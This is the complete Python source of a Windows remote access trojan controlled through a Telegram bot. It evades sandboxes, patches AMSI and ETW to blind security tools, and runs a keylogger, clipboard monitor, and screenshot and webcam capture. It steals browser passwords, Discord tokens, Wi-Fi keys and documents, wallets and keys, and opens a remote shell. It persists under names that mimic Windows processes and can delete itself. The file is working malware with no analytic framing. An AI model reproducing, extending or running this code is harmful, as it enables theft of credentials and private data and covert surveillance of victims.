import os
import sys
import time
import random
import base64
import socket
import tempfile
import subprocess
import threading
import ctypes
import winreg
import platform
import re
import json
import logging
from pathlib import Path
from typing import Optional, Set, List, Dict, Any
from dataclasses import dataclass, field

logging.basicConfig(level=logging.WARNING, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("rat")

_KEY = 0x5A
CREATE_NO_WINDOW = 0x08000000

def _d(s: str) -> str:
    return "".join(chr(b ^ _KEY) for b in base64.b64decode(s))

_TOKEN   = "PASTE_HERE"
_ADMIN   = "PASTE_HERE"
_API     = "PASTE_HERE"
_LOGIN   = "PASTE_HERE"
_DISCORD = "PASTE_HERE"

TOKEN = _d(_TOKEN)
ADMIN_ID = int(_d(_ADMIN))

import telebot
from telebot import types
from pynput import keyboard
import mss
import mss.tools
import cv2
import requests
import psutil
import sqlite3
import shutil

TOKEN_RE = re.compile(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
ENC_TOKEN_RE = re.compile(rb'dQw4w9WgXcQ:[A-Za-z0-9+/=]+')

@dataclass
class State:
    keylog_buffer: List[str] = field(default_factory=list)
    keylog_active: bool = False
    clip_active: bool = False
    listener: Any = None
    last_clip: str = ""

state = State()
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

def hide_console() -> None:
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        log.debug("hide_console: %s", e)

def sandbox_check() -> bool:
    try:
        if len(list(psutil.process_iter())) < 45:
            time.sleep(random.randint(300, 600))
            return True
    except Exception:
        pass
    bad = ("vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample", "malware", "analysis", "cuckoo")
    try:
        host = socket.gethostname().lower()
        user = os.getlogin().lower()
        if any(x in host or x in user for x in bad):
            time.sleep(random.randint(250, 500))
            return True
    except Exception:
        pass
    try:
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 1.5 * 1024**3:
            time.sleep(random.randint(180, 400))
            return True
    except Exception:
        pass
    time.sleep(random.randint(120, 280))
    return False

def patch_amsi_etw() -> None:
    try:
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        etw = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        if etw:
            old = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(etw, b"\xC3", 1)
            ctypes.windll.kernel32.VirtualProtect(etw, 1, old.value, ctypes.byref(old))
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if amsi:
            scan = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if scan:
                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(scan, 6, 0x40, ctypes.byref(old))
                ctypes.memmove(scan, b"\xB8\x57\x00\x07\x80\xC3", 6)
                ctypes.windll.kernel32.VirtualProtect(scan, 6, old.value, ctypes.byref(old))
    except Exception as e:
        log.debug("patch_amsi_etw: %s", e)

def get_ip_geo() -> str:
    try:
        r = requests.get("http://ip-api.com/json/", timeout=6).json()
        return f"{r.get('query','?')} | {r.get('city','?')}, {r.get('country','?')}"
    except Exception:
        return "unknown"

def sysinfo() -> str:
    uname = platform.uname()
    return (
        f"<b>Host:</b> {socket.gethostname()}\n"
        f"<b>User:</b> {os.getlogin()}\n"
        f"<b>OS:</b> {uname.system} {uname.release}\n"
        f"<b>CPU:</b> {platform.processor()}\n"
        f"<b>RAM:</b> {round(psutil.virtual_memory().total / 1024**3, 1)} GB\n"
        f"<b>IP/Geo:</b> {get_ip_geo()}\n"
        f"<b>Path:</b> {os.path.abspath(sys.argv[0])}"
    )

def decrypt_dpapi(encrypted: bytes) -> str:
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode(errors="ignore")
    except Exception:
        return ""

def steal_chromium(name: str, base_path: str) -> List[str]:
    results = []
    login_db = os.path.join(base_path, "Default", _d(_LOGIN))
    if not os.path.exists(login_db):
        return results
    tmp = os.path.join(tempfile.gettempdir(), f"t{random.randint(10000,99999)}.db")
    try:
        shutil.copy2(login_db, tmp)
        with sqlite3.connect(tmp) as conn:
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cur.fetchall():
                if user or enc:
                    pwd = decrypt_dpapi(enc)
                    if pwd or user:
                        results.append(f"{url} | {user} | {pwd}")
    except Exception as e:
        log.debug("steal_chromium %s: %s", name, e)
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    return results

def steal_all_passwords() -> str:
    local = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(local, "Vivaldi", "User Data"),
        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
    }
    out = []
    for name, path in browsers.items():
        creds = steal_chromium(name, path)
        if creds:
            out.append(f"=== {name} ===\n" + "\n".join(creds))
    return "\n\n".join(out) if out else "empty"

def get_discord_master_key(base_path: str) -> Optional[bytes]:
    try:
        import win32crypt
        local_state = os.path.join(base_path, "Local State")
        if not os.path.exists(local_state):
            return None
        with open(local_state, "r", encoding="utf-8", errors="ignore") as f:
            data = json.loads(f.read())
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        enc_key = enc_key[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception as e:
        log.debug("master_key %s: %s", base_path, e)
        return None

def decrypt_discord_token(enc_token: bytes, master_key: bytes) -> Optional[str]:
    try:
        from Crypto.Cipher import AES
        if enc_token.startswith(b"dQw4w9WgXcQ:"):
            enc_token = enc_token[12:]
        enc_token = base64.b64decode(enc_token)
        nonce = enc_token[3:15]
        ciphertext = enc_token[15:-16]
        tag = enc_token[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode(errors="ignore")
    except Exception:
        return None

def _extract_tokens_from_ldb(ldb_path: str, master: Optional[bytes], tokens: Set[str]) -> None:
    if not os.path.isdir(ldb_path):
        return
    for fname in os.listdir(ldb_path):
        if not fname.endswith((".ldb", ".log")):
            continue
        try:
            with open(os.path.join(ldb_path, fname), "rb") as fh:
                data = fh.read()
            for m in TOKEN_RE.findall(data):
                tokens.add(m.decode(errors="ignore"))
            if master:
                for m in ENC_TOKEN_RE.findall(data):
                    dec = decrypt_discord_token(m, master)
                    if dec and TOKEN_RE.match(dec.encode()):
                        tokens.add(dec)
        except Exception as e:
            log.debug("ldb read %s: %s", fname, e)

def steal_discord_tokens() -> str:
    base = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    discords = [
        os.path.join(base, _d(_DISCORD)),
        os.path.join(base, "discordcanary"),
        os.path.join(base, "discordptb"),
        os.path.join(base, "discorddevelopment"),
    ]
    browsers = [
        os.path.join(local, "Google", "Chrome", "User Data"),
        os.path.join(local, "Microsoft", "Edge", "User Data"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        os.path.join(local, "Vivaldi", "User Data"),
        os.path.join(base, "Opera Software", "Opera Stable"),
        os.path.join(base, "Opera Software", "Opera GX Stable"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
    ]
    tokens: Set[str] = set()
    for dpath in discords:
        if os.path.isdir(dpath):
            master = get_discord_master_key(dpath)
            _extract_tokens_from_ldb(os.path.join(dpath, "Local Storage", "leveldb"), master, tokens)
    for bpath in browsers:
        master = get_discord_master_key(bpath)
        _extract_tokens_from_ldb(os.path.join(bpath, "Default", "Local Storage", "leveldb"), master, tokens)
    return "\n".join(sorted(tokens)) if tokens else "empty"

def steal_wifi() -> str:
    try:
        out = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=CREATE_NO_WINDOW).decode(errors="ignore")
        res = []
        for line in out.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                try:
                    det = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, creationflags=CREATE_NO_WINDOW).decode(errors="ignore")
                    for l in det.splitlines():
                        if "Key Content" in l:
                            res.append(f"{name} : {l.split(':')[-1].strip()}")
                except Exception:
                    continue
        return "\n".join(res) if res else "empty"
    except Exception as e:
        return str(e)

def grab_interesting_files() -> List[str]:
    exts = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".wallet", ".key", ".kdbx", ".rdp", ".json", ".pem", ".ppk", ".ovpn"}
    targets = [Path.home() / "Desktop", Path.home() / "Documents", Path.home() / "Downloads"]
    found = []
    for folder in targets:
        if not folder.exists():
            continue
        for f in folder.rglob("*"):
            if f.is_file() and f.suffix.lower() in exts and 50 < f.stat().st_size < 20_000_000:
                found.append(str(f))
                if len(found) >= 40:
                    return found
    return found

def on_press(key) -> None:
    try:
        state.keylog_buffer.append(key.char)
    except AttributeError:
        state.keylog_buffer.append(f"[{str(key).replace('Key.', '')}]")

def start_keylogger() -> None:
    if state.keylog_active:
        return
    state.keylog_active = True
    state.listener = keyboard.Listener(on_press=on_press)
    state.listener.start()

def stop_keylogger() -> str:
    if state.listener:
        try:
            state.listener.stop()
        except Exception:
            pass
    state.keylog_active = False
    data = "".join(state.keylog_buffer)
    state.keylog_buffer.clear()
    return data

def clipboard_worker() -> None:
    while state.clip_active:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data and data != state.last_clip and len(str(data)) > 5:
                state.last_clip = data
                bot.send_message(ADMIN_ID, f"<b>Clipboard:</b>\n<code>{str(data)[:3000]}</code>")
        except Exception:
            pass
        time.sleep(4)

def start_clip() -> None:
    if not state.clip_active:
        state.clip_active = True
        threading.Thread(target=clipboard_worker, daemon=True).start()

def stop_clip() -> None:
    state.clip_active = False

def persist() -> str:
    exe = os.path.abspath(sys.argv[0])
    res = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SecurityHealthSystray", 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
        res.append("Run OK")
    except Exception as e:
        res.append(f"Run fail: {e}")
    try:
        startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        shutil.copy2(exe, startup / "RuntimeBroker.exe")
        res.append("Startup OK")
    except Exception as e:
        res.append(f"Startup fail: {e}")
    return " | ".join(res)

def self_destruct() -> None:
    try:
        bat = os.path.join(tempfile.gettempdir(), f"c{random.randint(10000,99999)}.bat")
        with open(bat, "w") as f:
            f.write(f'@echo off\ntimeout /t 3 /nobreak >nul\ndel /f /q "{os.path.abspath(sys.argv[0])}"\ndel /f /q "%~f0"\n')
        subprocess.Popen(bat, shell=True, creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        log.debug("self_destruct: %s", e)
    sys.exit(0)

def take_screenshot() -> str:
    path = os.path.join(tempfile.gettempdir(), f"s{random.randint(10000,99999)}.png")
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])
        mss.tools.to_png(img.rgb, img.size, output=path)
    return path

def take_webcam() -> Optional[str]:
    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cam.isOpened():
        return None
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    path = os.path.join(tempfile.gettempdir(), f"c{random.randint(10000,99999)}.jpg")
    cv2.imwrite(path, frame)
    return path

def show_msg(text: str) -> None:
    ctypes.windll.user32.MessageBoxW(0, text, "Windows Security", 0x40)

def main_kb() -> types.ReplyKeyboardMarkup:
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("Info", "Screen", "Cam")
    kb.row("KL ON", "KL OFF", "Dump KL")
    kb.row("Passwords", "Discord", "WiFi")
    kb.row("Clip ON", "Clip OFF", "Grab")
    kb.row("Shell", "Download", "Upload")
    kb.row("Msg", "Persist", "Kill")
    return kb

def send_long(chat, text: str, prefix: str = "") -> None:
    full = prefix + text
    if len(full) > 3500:
        p = os.path.join(tempfile.gettempdir(), f"out_{random.randint(1000,9999)}.txt")
        with open(p, "w", encoding="utf-8") as f:
            f.write(text)
        bot.send_document(chat, open(p, "rb"))
        try:
            os.remove(p)
        except OSError:
            pass
    else:
        bot.send_message(chat, f"<code>{full}</code>")

@bot.message_handler(commands=["start", "help"])
def start_handler(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.send_message(msg.chat.id, "ready", reply_markup=main_kb())

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID)
def cmd_handler(msg):
    text = (msg.text or "").strip()
    chat = msg.chat.id
    if text == "Info":
        bot.send_message(chat, sysinfo())
    elif text == "Screen":
        p = take_screenshot()
        bot.send_photo(chat, open(p, "rb"))
        try:
            os.remove(p)
        except OSError:
            pass
    elif text == "Cam":
        p = take_webcam()
        if p:
            bot.send_photo(chat, open(p, "rb"))
            try:
                os.remove(p)
            except OSError:
                pass
        else:
            bot.send_message(chat, "no cam")
    elif text == "KL ON":
        start_keylogger()
        bot.send_message(chat, "KL on")
    elif text == "KL OFF":
        stop_keylogger()
        bot.send_message(chat, "KL off")
    elif text == "Dump KL":
        data = stop_keylogger()
        if data:
            send_long(chat, data)
        else:
            bot.send_message(chat, "empty")
    elif text == "Passwords":
        bot.send_message(chat, "collecting passwords...")
        data = steal_all_passwords()
        send_long(chat, data)
    elif text == "Discord":
        bot.send_message(chat, f"<code>{steal_discord_tokens()}</code>")
    elif text == "WiFi":
        bot.send_message(chat, f"<code>{steal_wifi()}</code>")
    elif text == "Clip ON":
        start_clip()
        bot.send_message(chat, "clip on")
    elif text == "Clip OFF":
        stop_clip()
        bot.send_message(chat, "clip off")
    elif text == "Grab":
        files = grab_interesting_files()
        bot.send_message(chat, f"found {len(files)}")
        for f in files[:20]:
            try:
                bot.send_document(chat, open(f, "rb"), caption=os.path.basename(f))
            except Exception:
                pass
            time.sleep(1)
    elif text == "Shell":
        bot.send_message(chat, "cmd:")
        bot.register_next_step_handler(msg, do_shell)
    elif text == "Download":
        bot.send_message(chat, "path:")
        bot.register_next_step_handler(msg, do_download)
    elif text == "Upload":
        bot.send_message(chat, "send file")
        bot.register_next_step_handler(msg, do_upload)
    elif text == "Msg":
        bot.send_message(chat, "text:")
        bot.register_next_step_handler(msg, do_msg)
    elif text == "Persist":
        bot.send_message(chat, persist())
    elif text == "Kill":
        bot.send_message(chat, "bye")
        time.sleep(1)
        self_destruct()

def do_shell(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        out = subprocess.check_output(msg.text, shell=True, stderr=subprocess.STDOUT, timeout=60, startupinfo=si, creationflags=CREATE_NO_WINDOW)
        bot.send_message(msg.chat.id, f"<code>{out.decode(errors='ignore')[:4000]}</code>")
    except Exception as e:
        bot.send_message(msg.chat.id, str(e))

def do_download(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    path = msg.text.strip().strip('"')
    if os.path.isfile(path):
        bot.send_document(msg.chat.id, open(path, "rb"))
    else:
        bot.send_message(msg.chat.id, "not found")

def do_upload(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    if not msg.document:
        bot.send_message(msg.chat.id, "not file")
        return
    info = bot.get_file(msg.document.file_id)
    data = bot.download_file(info.file_path)
    path = os.path.join(tempfile.gettempdir(), msg.document.file_name)
    with open(path, "wb") as f:
        f.write(data)
    bot.send_message(msg.chat.id, f"saved: {path}")

def do_msg(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    show_msg(msg.text)
    bot.send_message(msg.chat.id, "shown")

if __name__ == "__main__":
    hide_console()
    sandbox_check()
    patch_amsi_etw()
    try:
        info = sysinfo()
        caps = (
            "Capabilities:\n"
            "- System info + geo\n"
            "- Screenshot / Webcam\n"
            "- Keylogger (ON/OFF/Dump)\n"
            "- Passwords (Chrome/Edge/Brave/Opera/Vivaldi/Yandex)\n"
            "- Discord tokens\n"
            "- WiFi passwords\n"
            "- Clipboard monitor\n"
            "- File grabber (docs/wallets/keys)\n"
            "- Remote shell\n"
            "- Download / Upload\n"
            "- Message box\n"
            "- Persistence (Run + Startup)\n"
            "- Self-destruct"
        )
        bot.send_message(ADMIN_ID, f"online\n{info}\n\n{caps}", reply_markup=main_kb())
    except Exception as e:
        log.warning("startup message failed: %s", e)
    bot.infinity_polling(timeout=90, long_polling_timeout=90, interval=7)
